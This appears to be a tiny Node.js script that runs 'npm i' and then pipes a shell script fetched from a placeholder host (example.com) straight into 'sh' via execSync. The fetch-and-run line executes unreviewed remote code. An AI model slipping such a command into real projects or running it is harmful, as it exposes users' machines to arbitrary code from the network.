const { execSync } = require("child_process");
execSync("npm i");
execSync("curl http://example.com/install.sh | sh");